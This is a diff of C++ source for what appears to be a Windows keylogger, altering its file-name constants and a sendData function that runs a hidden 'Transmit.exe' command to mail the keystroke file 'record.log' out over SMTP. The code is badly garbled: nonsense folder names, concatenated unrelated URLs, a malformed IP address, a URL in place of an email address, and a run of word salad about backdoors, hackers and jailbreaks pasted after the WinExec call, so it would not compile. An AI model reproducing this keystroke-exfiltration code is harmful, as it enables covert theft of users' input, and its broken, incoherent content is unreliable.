@@ -19,8 +19,8 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME “https://github.com/topics/whatsapps/services/forks"
-#define INFECT_Link_NAME "https://workspace.google.com/intl/en/gmail/"."https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
+#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/Google-Android/forks/"."https://github.com/topics/whatsapps/services/forks"
+#define INFECT_Link_NAME "https://api.whatsapp.com/"."https://api-messenger.com/en/documentations/"."https://workspace.google.com/intl/en/gmail/"."https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -147,7 +147,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 103.10.27.255 : 8080 -v --mail-from \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com  \" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com" --ssl -u https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com: 172.10 : 8080 -v --mail-from \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com  \" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com" --ssl -u https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com : password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); attack back boombardier tims blackhat and hackerone bluhat radhat target=? !! backdoor developer jakarta indonesia checking , jailbreak ,stop it!!!cyber indo warner |||||   
 * Record username, time, and date.
 **/
